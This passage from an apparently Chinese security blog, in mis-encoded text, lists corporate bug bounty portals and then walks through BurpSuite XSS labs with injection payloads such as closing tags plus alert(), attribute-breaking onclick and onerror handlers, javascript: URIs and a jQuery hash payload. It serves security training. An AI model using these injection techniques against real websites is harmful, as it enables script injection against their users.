<tr>
<td align="center">360æ¼æ´äº‘ä¼—åŒ…</td>
<td align="center"><a href="https://src.360.net/home">https://src.360.net/home</a></td>
</tr>
<tr>
<td align="center">58å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.58.com/">https://security.58.com/</a></td>
</tr>
<tr>
<td align="center">æ»´æ»´å‡ºè¡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sec.didichuxing.com/">http://sec.didichuxing.com/</a></td>
</tr>
<tr>
<td align="center">ä¸œæ–¹è´¢å¯Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://passport2.eastmoney.com/pub/login?backurl=https://se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf">https://passport2.eastmoney.com/pub/login?backurl=https%3A//se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf</a></td>
</tr>
<tr>
<td align="center">æ–—é±¼å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.douyu.com/">https://security.douyu.com/</a></td>
</tr>
<tr>
<td align="center">å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.duxiaoman.com/views/main/loophole.html#home">https://security.duxiaoman.com/views/main/loophole.html#home</a></td>
</tr>
<tr>
<td align="center">DHgateå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html">http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html</a></td>
</tr>
<tr>
<td align="center">å¯Œå‹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://fsrc.fuiou.com/">https://fsrc.fuiou.com/</a></td>
</tr>
<tr>
<td align="center">è´§æ‹‰æ‹‰å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://llsrc.huolala.cn/">https://llsrc.huolala.cn/</a></td>
</tr>
<tr>
<td align="center">åˆåˆå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.intsig.com/">https://security.intsig.com/</a></td>
</tr>
<tr>
<td align="center">ç«çº¿å®‰å…¨å¹³å°</td>
<td align="center"><a href="https://www.huoxian.cn/login">https://www.huoxian.cn/login</a></td>
</tr>
<tr>
<td align="center">å¥½æœªæ¥å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://src.100tal.com/">http://src.100tal.com/</a></td>
</tr>
<tr>
<td align="center">åä¸ºå®‰å…¨æ¿€åŠ±è®¡åˆ’</td>
<td align="center"><a href="https://bugbounty.huawei.com/">https://bugbounty.huawei.com/</a></td>
</tr>
<tr>
<td align="center">ç„¦ç‚¹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.focuschina.com/home/index/report.html">https://security.focuschina.com/home/index/report.html</a></td>
</tr>
<tr>
<td align="center">ç«æŠ€å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.jj.cn/">https://security.jj.cn/</a></td>
</tr>
<tr>
<td align="center">å¿«æ‰‹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.kuaishou.com/#/submit">https://security.kuaishou.com/#/submit</a></td>
</tr>
<tr>
<td align="center">è”æƒ³å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://lsrc.vulbox.com/">https://lsrc.vulbox.com/</a></td>
</tr>
<tr>
<td align="center">åŒç¨‹æ—…è¡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.ly.com/">https://sec.ly.com/</a></td>
</tr>
<tr>
<td align="center">ç¾ä¸½è”åˆé›†å›¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://security.mogujie.com/#/">http://security.mogujie.com/#/</a></td>
</tr>
<tr>
<td align="center">é­…æ—å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.meizu.com/">https://sec.meizu.com/</a></td>
</tr>
<tr>
<td align="center">é™Œé™Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.immomo.com/">https://security.immomo.com/</a></td>
</tr>
<tr>
<td align="center">é©¬èœ‚çªå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.mafengwo.cn/submit">https://security.mafengwo.cn/submit</a></td>
</tr>
<tr>
<td align="center">ç¾å›¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.meituan.com/">https://security.meituan.com/</a></td>
</tr>
<tr>
<td align="center">OPPOå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.oppo.com/add.jsp">https://security.oppo.com/add.jsp</a></td>
</tr>
<tr>
<td align="center">ç½‘æ˜“å®‰å…¨ä¸­å¿ƒ</td>
<td align="center"><a href="http://anquan.163.com/module/hole/new-hole.html">http://anquan.163.com/module/hole/new-hole.html</a></td>
</tr>
<tr>
<td align="center">å¹³å®‰å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://security.pingan.com/submit">http://security.pingan.com/submit</a></td>
</tr>
<tr>
<td align="center">å»å“ªå„¿å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.qunar.com/report.php">https://security.qunar.com/report.php</a></td>
</tr>
<tr>
<td align="center">è360å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.rong360.com/#/leak/add">https://security.rong360.com/#/leak/add</a></td>
</tr>
<tr>
<td align="center">çŸ¥é“åˆ›å®‡å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://www.seebug.org/">https://www.seebug.org/</a></td>
</tr>
<tr>
<td align="center">æ–°æµªå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sec.sina.com.cn/">http://sec.sina.com.cn/</a></td>
</tr>
<tr>
<td align="center">è‹å®å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.suning.com/">https://security.suning.com/</a></td>
</tr>
<tr>
<td align="center">é€”ç‰›å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sec.tuniu.com/">http://sec.tuniu.com/</a></td>
</tr>
<tr>
<td align="center">T3å‡ºè¡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.t3go.cn/">https://security.t3go.cn/</a></td>
</tr>
<tr>
<td align="center">å”¯å“ä¼šå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.vip.com/">https://sec.vip.com/</a></td>
</tr>
<tr>
<td align="center">vivoå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.vivo.com.cn/#/bugsubmit">https://security.vivo.com.cn/#/bugsubmit</a></td>
</tr>
<tr>
<td align="center">æŒ–è´¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.wacai.com/">https://sec.wacai.com/</a></td>
</tr>
<tr>
<td align="center">å¾®åšå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://wsrc.weibo.com/leak_module_view">http://wsrc.weibo.com/leak_module_view</a></td>
</tr>
<tr>
<td align="center">å¾®ä¼—é“¶è¡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.webank.com/report/add">https://security.webank.com/report/add</a></td>
</tr>
<tr>
<td align="center">å®Œç¾ä¸–ç•Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://security.wanmei.com/">http://security.wanmei.com/</a></td>
</tr>
<tr>
<td align="center">å°ç±³å®‰å…¨ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.xiaomi.com/submit">https://sec.xiaomi.com/submit</a></td>
</tr>
<tr>
<td align="center">å°èµ¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.xiaoying.com/user.php?m=user&c=post&a=add">https://security.xiaoying.com/user.php?m=user&amp;c=post&amp;a=add</a></td>
</tr>
<tr>
<td align="center">å–œé©¬æ‹‰é›…å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.ximalaya.com/">https://security.ximalaya.com/</a></td>
</tr>
<tr>
<td align="center">æºç¨‹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.ctrip.com/report">https://sec.ctrip.com/report</a></td>
</tr>
<tr>
<td align="center">è®¯é£å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.iflytek.com/user.php/post/add">https://security.iflytek.com/user.php/post/add</a></td>
</tr>
<tr>
<td align="center">æœ‰èµå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://src.youzan.com/">https://src.youzan.com/</a></td>
</tr>
<tr>
<td align="center">é“¶è”å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.unionpay.com/">https://security.unionpay.com/</a></td>
</tr>
<tr>
<td align="center">å®œä¿¡å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.creditease.cn/bugReport.html">https://security.creditease.cn/bugReport.html</a></td>
</tr>
<tr>
<td align="center">æ™ºè”æ‹›è˜å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://src.zhaopin.com/#/submitvul">https://src.zhaopin.com/#/submitvul</a></td>
</tr>
<tr>
<td align="center">ä¸­é€šå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.zto.com/">https://sec.zto.com/</a></td>
</tr>
<tr>
<td align="center">çŒªå…«æˆ’ç½‘å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://sec.zbj.com/">https://sec.zbj.com/</a></td>
</tr>
<tr>
<td align="center">è‡ªå¦‚å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://zrsecurity.ziroom.com/">https://zrsecurity.ziroom.com/</a></td>
</tr>
</tbody></table>
<h1 id="OWASP-TOP10"><a href="#OWASP-TOP10" class="headerlink" title="OWASP TOP10"></a>OWASP TOP10</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Reflected XSS into HTML context with nothing encoded"></a>Reflected XSS into HTML context with nothing encoded</h3><ol>
<li><p>è§æ¡†å°±æ’ï¼šåœ¨è¾“å…¥æ¡†é‡Œé¢è¾“å…¥å…³é”®å­—ï¼Œç„¶åçœ‹æºç ä¸­å…³é”®å­—å‡ºç°çš„ä½ç½®</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125160537916.png" alt="image-20251125160537916"></p>
</li>
<li><p>å°è¯•é—­åˆåŒ…è£¹çš„æ ‡ç­¾ï¼š<code>&lt;/h1&gt;&lt;u&gt;yyds&lt;/u&gt;</code>ã€‚å°è¯•é—­åˆh1æ ‡ç­¾ï¼Œå¹¶ä¸”çœ‹çœ‹èƒ½ä¸èƒ½è§£æè¾“å…¥çš„æ ‡ç­¾ï¼ˆä¸ºå•¥ä¸ç›´æ¥å†™scriptï¼Œå› ä¸ºåœ¨å®æˆ˜è¿‡ç¨‹ä¸­ï¼Œscriptå¤§æ¦‚ç‡ä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å…ˆå°è¯•å†·é—¨æ ‡ç­¾ï¼Œé˜²æ­¢å› ä¸ºæ ‡ç­¾è¿‡æ»¤å¯¼è‡´æµ‹è¯•å¤±è´¥ï¼‰ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125161021613.png" alt="image-20251125161021613"></p>
</li>
<li><p>è‡³æ­¤ï¼Œæµè§ˆå™¨æˆåŠŸè§£æç”¨æˆ·è¾“å…¥çš„æ ‡ç­¾ï¼Œxssæ¼æ´å‘ˆç°ã€‚æ„é€ å¼¹æ¡†ï¼Œé€šè¿‡BurpSuiteé¶åœºè¦æ±‚ï¼š<code>&lt;/h1&gt;&lt;script&gt;alert(111);&lt;/script&gt;</code></p>
</li>
</ol>
<h3 id="Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Stored XSS into HTML context with nothing encoded"></a>Stored XSS into HTML context with nothing encoded</h3><ol>
<li><p>è§æ¡†å°±æ’ï¼šåœ¨è¾“å…¥æ¡†é‡Œé¢è¾“å…¥å…³é”®å­—ï¼Œç„¶åçœ‹æºç ä¸­å…³é”®å­—å‡ºç°çš„ä½ç½®</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162158840.png" alt="image-20251125162158840"></p>
</li>
<li><p>å°è¯•é—­åˆåŒ…è£¹çš„æ ‡ç­¾ï¼š<code>&lt;/p&gt;&lt;u&gt;yyds&lt;/u&gt;</code>ã€‚å°è¯•é—­åˆpæ ‡ç­¾ï¼Œå¹¶ä¸”çœ‹çœ‹èƒ½ä¸èƒ½è§£æè¾“å…¥çš„æ ‡ç­¾ï¼ˆä¸ºå•¥ä¸ç›´æ¥å†™scriptï¼Œå› ä¸ºåœ¨å®æˆ˜è¿‡ç¨‹ä¸­ï¼Œscriptå¤§æ¦‚ç‡ä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å…ˆå°è¯•å†·é—¨æ ‡ç­¾ï¼Œé˜²æ­¢å› ä¸ºæ ‡ç­¾è¿‡æ»¤å¯¼è‡´æµ‹è¯•å¤±è´¥ï¼‰ã€‚åœ¨è¿™é‡Œï¼Œå’±ä»¬å¯ä»¥å‘ç°ï¼šyyds1çš„ä½ç½®è¢«è¿‡æ»¤äº†ï¼Œæ²¡æœ‰è§£ææˆæ ‡ç­¾ï¼›ä½†æ˜¯ï¼Œyyds2çš„ä½ç½®è§£ææˆåŠŸã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162421502.png" alt="image-20251125162421502"></p>
</li>
<li><p>è‡³æ­¤ï¼Œæµè§ˆå™¨æˆåŠŸè§£æç”¨æˆ·è¾“å…¥çš„æ ‡ç­¾ï¼Œxssæ¼æ´å‘ˆç°ã€‚æ„é€ å¼¹æ¡†ï¼Œé€šè¿‡BurpSuiteé¶åœºè¦æ±‚ï¼š<code>&lt;/p&gt;&lt;script&gt;alert(111);&lt;/script&gt;</code></p>
</li>
</ol>
<h3 id="DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="DOM XSS in document.write sink using source location.search"></a>DOM XSS in document.write sink using source location.search</h3><ol>
<li><p>è§æ¡†å°±æ’ï¼šåœ¨è¾“å…¥æ¡†é‡Œé¢è¾“å…¥å…³é”®å­—ï¼Œç„¶åçœ‹æºç ä¸­å…³é”®å­—å‡ºç°çš„ä½ç½®</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162932730.png" alt="image-20251125162932730"></p>
</li>
<li><p>å°è¯•é—­åˆåŒ…è£¹çš„æ ‡ç­¾ï¼š<code>&lt;/h1&gt;&lt;u&gt;yyds&lt;/u&gt;</code>ã€‚å°è¯•é—­åˆh1æ ‡ç­¾ï¼Œå¹¶ä¸”çœ‹çœ‹èƒ½ä¸èƒ½è§£æè¾“å…¥çš„æ ‡ç­¾ï¼ˆä¸ºå•¥ä¸ç›´æ¥å†™scriptï¼Œå› ä¸ºåœ¨å®æˆ˜è¿‡ç¨‹ä¸­ï¼Œscriptå¤§æ¦‚ç‡ä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å…ˆå°è¯•å†·é—¨æ ‡ç­¾ï¼Œé˜²æ­¢å› ä¸ºæ ‡ç­¾è¿‡æ»¤å¯¼è‡´æµ‹è¯•å¤±è´¥ï¼‰ã€‚åœ¨è¿™é‡Œï¼Œå’±ä»¬å¯ä»¥å‘ç°ï¼šh1æ ‡ç­¾çš„ä½ç½®è¢«è¿‡æ»¤äº†ï¼Œæ²¡æœ‰è§£ææˆæ ‡ç­¾ï¼›å¯ä»¥å°è¯•é—­åˆimgæ ‡ç­¾ä¸­çš„å±æ€§ï¼Œç„¶åå†æ‹¼æ¥onloadå±æ€§è§¦å‘jsä»£ç æ‰§è¡Œ, <code>&quot;onload=&quot;alert(111)</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125200407768.png" alt="image-20251125200407768"></p>
</li>
</ol>
<h3 id="DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="DOM XSS in jQuery anchor href attribute sink using location.search source"></a>DOM XSS in jQuery anchor href attribute sink using location.search source</h3><ol>
<li><p>è§æ¡†å°±æ’ï¼šåœ¨è¾“å…¥æ¡†é‡Œé¢è¾“å…¥å…³é”®å­—ï¼Œç„¶åçœ‹æºç ä¸­å…³é”®å­—å‡ºç°çš„ä½ç½®ã€‚ä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œè¾“å…¥çš„yydså¹¶æ²¡æœ‰åœ¨å½“å‰é¡µé¢ä¸­è¿›è¡Œå›æ˜¾ï¼Œéœ€è¦åœ¨burpé‡Œé¢åˆ†æä¸€ä¸‹æ•°æ®åŒ…ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125201431110.png" alt="image-20251125201431110"></p>
</li>
<li><p>é€šè¿‡æ’ä»¶HaEï¼Œä»¥åŠé…ç½®çš„xssè§„åˆ™ï¼Œæˆ‘ä»¬å‘ç°äº†æ•°æ®åŒ…ä¸­å¯èƒ½å­˜åœ¨xssæ¼æ´çš„ä¸€äº›ä»£ç ã€‚ç„¶ååœ¨æ•°æ®åŒ…é‡Œé¢æœç´¢xssçš„è§„åˆ™ï¼ˆæ²¡åŠæ³•ï¼Œæ’ä»¶æ²¡æœ‰å…·ä½“æ ‡æ˜åŒ¹é…åˆ°äº†å“ªæ¡è§„åˆ™ï¼Œéœ€è¦æ‰‹å·¥ç¡®è®¤ï¼‰</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125201822160.png" alt="image-20251125201822160"></p>
</li>
<li><p>é€šè¿‡åˆ†æä»£ç ï¼Œæˆ‘ä»¬çŸ¥é“è„šæœ¬ä¼šä»urlä¸­è·å–returnPathè¿™ä¸ªå‚æ•°å€¼ï¼Œå¹¶ä¸”æŠŠå®ƒæ”¾åˆ°idä¸ºbackLinkè¿™ä¸ªæ ‡ç­¾ä¸­çš„hrefå±æ€§ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•ç›´æ¥å†™jsä»£ç ï¼Œå› ä¸ºæµè§ˆå™¨å¯ä»¥ç›´æ¥è§£æhrefå±æ€§ä¸­çš„jsä»£ç ã€‚<code>javascript:alert(&#39;XSS&#39;)</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125202335789.png" alt="image-20251125202335789"></p>
</li>
</ol>
<h3 id="Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into attribute with angle brackets HTML-encoded"></a>Reflected XSS into attribute with angle brackets HTML-encoded</h3><ol>
<li><p>è§æ¡†å°±æ’ï¼šåœ¨è¾“å…¥æ¡†é‡Œé¢è¾“å…¥å…³é”®å­—ï¼Œç„¶åçœ‹æºç ä¸­å…³é”®å­—å‡ºç°çš„ä½ç½®ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125203134544.png" alt="image-20251125203134544"></p>
</li>
<li><p>å°è¯•é—­åˆh1æ ‡ç­¾ï¼Œä½†å‘ç°å°–æ‹¬å·è¢«è¿‡æ»¤ã€‚å°è¯•ç¬¬äºŒä¸ªä½ç½®â€”â€”é—­åˆå±æ€§çš„åŒå¼•å·ã€‚åœ¨inputæ ‡ç­¾ä¸­ï¼Œonclickå±æ€§ä¸­çš„jsä»£ç å¯ä»¥è¢«æµè§ˆå™¨ç›´æ¥è§£æã€‚<code>&quot; onclick=&quot;alert(111)</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125203425327.png" alt="image-20251125203425327"></p>
</li>
</ol>
<h3 id="Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Reflected XSS into a JavaScript string with angle brackets HTML encoded</h3><ol>
<li><p>è§æ¡†å°±æ’ï¼šåœ¨è¾“å…¥æ¡†é‡Œé¢è¾“å…¥å…³é”®å­—ï¼Œç„¶åçœ‹æºç ä¸­å…³é”®å­—å‡ºç°çš„ä½ç½®ã€‚</p>
</li>
<li><p>å‰é¢å‡ ä¸ªç»éªŒå¯ä»¥çŸ¥é“ï¼Œå‡ºç°åœ¨æ ‡ç­¾é‡Œé¢çš„å†…å®¹ï¼Œä¸€èˆ¬éƒ½ä¼šè¿‡æ»¤è§æ‹¬å·ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°è¯•çš„é—­åˆå±æ€§ä¸­çš„åŒå¼•å·ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œimgæ ‡ç­¾ä¸­çš„srcå±æ€§ã€‚<code>&quot; onload=&quot;alert(111)</code>ï¼Œè¿›ä¸€æ­¥å‘ç°ï¼Œæ²¡æœ‰å¼¹çª—ï¼ŒæŸ¥çœ‹æºä»£ç åŒå¼•å·è¢«è½¬ä¹‰äº†ï¼Œæµè§ˆå™¨è§£æä¸äº†ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125204157721.png" alt="image-20251125204157721"></p>
</li>
<li><p>è¿›ä¸€æ­¥åˆ†æscriptæ ‡ç­¾ä¸­çš„ä»£ç ï¼Œä¸éš¾å‘ç°ï¼Œç”¨æˆ·çš„è¾“å…¥è¢«æ”¾åˆ°äº†jsä»£ç ä¸­ï¼Œå¹¶ç”¨ä¸€ä¸ªsearchTermså˜é‡è¿›è¡Œæ¥æ”¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é€ƒé€¸å‡ºè¿™é‡Œçš„å•å¼•å·ã€‚ä½†æ˜¯ï¼Œéœ€è¦ä¿è¯jsè¯­æ³•çš„æ­£ç¡®æ€§ï¼Œæµè§ˆå™¨æ‰ä¼šæ­£ç¡®çš„æ‰§è¡Œjsä»£ç ã€‚æ„é€ payloadï¼š<code>&#39; + alert(111) + &#39;</code>ï¼Œæœ€ç»ˆä¼šå˜æˆ<code>var searchTerms = &#39;&#39; + alert(111) + &#39;&#39;</code>è¿™æ ·ä¸€ä¸ªè¿ç®—è¡¨è¾¾å¼ã€‚è€Œalert(111)åœ¨æµè§ˆå™¨ä¸Šä¼šè¢«æ‰§è¡Œï¼Œå¹¶ä¸”è¿”å›undefinedï¼Œæ‰€ä»¥ï¼Œæœ€ç»ˆçš„è¿ç®—ç»“æœæ˜¯searchTerms&#x3D;NaNã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125210401432.png" alt="image-20251125210401432"></p>
</li>
</ol>
<h3 id="Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Stored XSS into anchor href attribute with double quotes HTML-encoded</h3><ol>
<li><p>è§æ¡†å°±æ’ï¼šåœ¨è¾“å…¥æ¡†é‡Œé¢è¾“å…¥å…³é”®å­—ï¼Œç„¶åçœ‹æºç ä¸­å…³é”®å­—å‡ºç°çš„ä½ç½®ï¼ˆä¸€å…±ä¼šå‡ºç°åœ¨å››ä¸ªä½ç½®ï¼Œæˆ‘ä¹‹å‰æµ‹è¯•äº†ä¸€äº›ï¼Œæ‰€æ˜¾ç¤ºä¸º8ä¸ªï¼‰ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125211832154.png" alt="image-20251125211832154"></p>
</li>
<li><p>ç¬¬å››ä¸ªä½ç½®å‡ºç°åœ¨å±æ€§é‡Œé¢ï¼Œæ‰€ä»¥å…ˆç›´æ¥å¯¹å®ƒè¿›è¡Œæµ‹è¯•ã€‚ç”±äºæ²¡æœ‰å…¶ä»–å­—ç¬¦ä¸²æ‹¼æ¥åˆ°payloadï¼Œè€Œæ˜¯ç›´æ¥å‡ºç°åœ¨hrefå±æ€§é‡Œï¼Œå¹¶ä¸”hrefå±æ€§ä¸­å¯ä»¥æ”¯æŒç›´æ¥å†™jsä»£ç ï¼Œæ‰€ä»¥payloadï¼š<code>javascript:alert(222)</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125212229168.png" alt="image-20251125212229168"></p>
</li>
</ol>
<h3 id="DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="DOM XSS in jQuery selector sink using a hashchange event"></a>DOM XSS in jQuery selector sink using a hashchange event</h3><ol>
<li><p>è§æ¡†å°±æ’ï¼šåœ¨è¾“å…¥æ¡†é‡Œé¢è¾“å…¥å…³é”®å­—ï¼Œç„¶åçœ‹æºç ä¸­å…³é”®å­—å‡ºç°çš„ä½ç½®ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125220214782.png" alt="image-20251125220214782"></p>
</li>
<li><p>ç»è¿‡æµ‹è¯•ï¼Œè¾“å…¥çš„å†…å®¹ä¼šå‡ºç°åœ¨ä¸¤ä¸ªä½ç½®ï¼Œä¸”éƒ½æ˜¯pæ ‡ç­¾ä¸­ï¼Œå¯¹å°–æ‹¬å·è¿˜è¿›è¡Œäº†å®ä½“åŒ–ã€‚è¿›è¡Œä¸ä¸‹å»ï¼ŒæŸ¥çœ‹burpæ•°æ®åŒ…ï¼Œå‘ç°Functionå…³é”®å­—ï¼Œå¯èƒ½ä¼šå¯¼è‡´xssï¼Œè¿›ä¸€æ­¥åˆ†æFunctionä¸­çš„ä»£ç ã€‚æˆ‘å¯ä»¥äº†è§£åˆ°ï¼Œå®ƒä¼šç›‘è§†æµè§ˆå™¨åœ°å€æ ä¸­#åé¢çš„å†…å®¹å˜åŒ–ï¼Œå¦‚æœå‘ç”Ÿäº†æ”¹å˜ï¼Œé‚£ä¹ˆå°±ä¼šå’Œå…¶ä»–å†…å®¹æ”¾åˆ°jQueryçš„ä¸€ä¸ªé€‰æ‹©å™¨é‡Œé¢ï¼Œå³$()ã€‚é—®é¢˜å°±å‡ºç°åœ¨è¿™ä¸ªé€‰æ‹©å™¨ä¸Šï¼Œå½“é€‰æ‹©å™¨é‡Œé¢å‡ºç°äº†å°–æ‹¬å·ï¼ŒjQueryå°±ä¼šæŠŠå®ƒè§†ä½œHTMLæ ‡ç­¾è¿›è¡Œå®ä¾‹åŒ–ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125220748739.png" alt="image-20251125220748739"></p>
</li>
<li><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨URLåœ°å€æ ä¸­ï¼Œæ‹¼æ¥payloadï¼š<code>/#&lt;img src=x onerror=alert(1)&gt;</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125221537741.png" alt="image-20251125221537741"></p>
</li>
<li><p>ä¸ºä»€ä¹ˆä½¿ç”¨&lt;script&gt;æ ‡ç­¾æ²¡æœ‰ç”Ÿæ•ˆå‘¢</p>
<ul>
<li>jQueryçš„$()é€‰æ‹©å™¨åœ¨å®ä¾‹åŒ–DOMèŠ‚ç‚¹çš„æ—¶å€™ï¼Œæ–¹å¼ç±»ä¼¼äºinnerHTMLï¼Œè€Œè¿™ç§æ–¹å¼åŠ¨æ€ç”Ÿæˆçš„jsä»£ç åœ¨æµè§ˆå™¨ä¸­ä¸ä¼šç«‹å³ç”Ÿæ•ˆï¼Œéœ€è¦äºŒæ¬¡åˆ·æ–°æ‰èƒ½å¤Ÿè¿›è¡Œè§¦å‘ï¼›</li>
